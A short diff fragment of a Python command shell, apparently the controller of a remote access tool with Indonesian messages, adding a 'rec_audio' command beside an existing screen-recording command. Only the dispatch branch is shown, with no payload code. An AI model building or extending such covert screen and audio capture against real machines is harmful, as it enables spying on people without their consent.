@@ -186,6 +186,8 @@ def shellc():
              file.close()
         elif perintah == 'screensr':
              record_screen()
+        elif perintah == 'rec_audio':
+             recieve_and_save()
         elif perintah == 'help':
              print("""
                    -exit/quit >> keluar
